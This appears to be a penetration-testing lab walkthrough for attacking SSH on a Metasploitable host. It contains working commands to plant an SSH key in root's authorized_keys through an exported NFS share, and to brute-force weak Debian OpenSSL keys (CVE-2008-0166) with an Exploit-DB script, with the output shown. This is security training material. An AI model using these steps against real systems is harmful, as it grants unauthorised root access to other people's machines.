
## Port 22 | ssh (OpenSSH)

https://www.youtube.com/watch?v=OxwKjp8xm9c

### Attack Vector #1 

1. Generate a new SSH key on Kali
```
# ssh-keygen
```
2. Checking Network File System (NFS)

- Option 1: use Nmap script to identify NFS
```
# nmap --script=nfs-ls 192.168.50.7
# nmap --script=nfs-showmount 192.168.50.7
```
- Option 2: use `showmount` command to determine if the "/" share (the root of the file system) is being exported. May need to install nfs-common package to use "showmount" command
```
# apt-get install nfs-common
# showmount -e 192.168.50.7
```
3. Mount the NFS export
```
# mkdir /tmp/victim
# mount -t nfs 192.168.50.7:/ /tmp/victim/
```
4. Add Kali's SSH key to the root user account's authorized_keys file (on the victim machine)
```
# cat ~/.ssh/id_rsa.pub >> /tmp/victim/root/.ssh/authorized_keys
# umount /tmp/victim
```
OR we can also get authorized SSH keys from the victim machine using the following command
```
# cat /tmp/victim/root/.ssh/authorized_keys
```
5. Login to victim machine using Kali's SSH key
```
# ssh root@192.168.50.7

root@metasploitable:~# whoami
```
### Attack Vector #2 

CVE-2008-0166

OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.

1. We need to download the pre-calculated vulnerable keys from the link below

https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2

2. Extract the file
```
# cp ~/Downloads/5622.tar.bz2 ~
# tar xvjf 5622.tar.bz2
```
3. Create the following Python script

https://www.exploit-db.com/exploits/5720/
```
# nano brute_force_ssh.py
# chmod 755 brute_force_ssh.py 
```
4. Run the script as follows
```
# python brute_force_ssh.py ~/rsa/2048/ 192.168.50.7 root
```
The above script checks if the `root` account has a weak SSH key, testing each key in the directory where we placed the keys (~/rsa/2048/)

5. Result...(about 15' using my laptop)
```
[snip]
...
Tested 18334 keys | Remaining 14434 keys | Aprox. Speed 26/sec
Tested 18472 keys | Remaining 14296 keys | Aprox. Speed 27/sec
Tested 18623 keys | Remaining 14145 keys | Aprox. Speed 30/sec

Key Found in file: 57c3115d77c56390332dc5c49978627a-5429
...
[snip]
```
6. After finding out the key, we can use it to log in as `root` via ssh
```
# ssh -l root -p 22 -i /root/rsa/2048//57c3115d77c56390332dc5c49978627a-5429 192.168.50.7

root@metasploitable:~# whoami
```

